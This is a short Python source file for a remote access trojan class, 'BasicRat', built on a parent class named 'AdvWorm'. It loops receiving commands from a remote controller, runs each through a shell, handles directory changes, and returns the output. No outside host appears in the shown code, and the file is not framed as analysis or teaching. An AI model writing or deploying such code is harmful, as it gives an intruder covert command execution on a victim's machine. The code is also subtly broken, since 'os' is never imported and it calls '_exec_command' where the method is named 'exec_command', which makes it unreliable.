

import subprocess

class BasicRat(AdvWorm):
    def __init__(self):
        super().__init__()
        self.name = "Basic Rat"
    
    def RUN(self):
        while True:
            msg = self.recive_msg()
            print("MSG: ", msg)
            if not msg:
                return True
            if msg.startswith(self.sys_msg):
                self._exec_sys_command(msg)
                continue
            self._exec_command(msg)

    def get_cwd(self):
        return "\n" + "*" * 80 + f"\n\n{os.getcwd()}\n"
    
    def change_dir(self, new):
        try:
            os.chdir(new)
            out = "Change Dir Successfull" + self.get_cwd()
        except Exception as e:
            out = f"ERROR: {e}"
        
        return out

    def cmd_command(self, cmd):
        if cmd == "pwd":
            return self.get_cwd()
        elif cmd.startswith("cd"):
            return self.change_dir(cmd[3:])
        try:
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if out.returncode == 0:
                return str(out.stdout) + self.get_cwd()
            else:
                return "ERROR: " + str(out.stderr)
        except Exception as e:
            return f"ERROR: {e}" + self.get_cwd()
    
    def exec_command(self, cmd):
        response = self.cmd_command(cmd)
        self.send_msg(response)


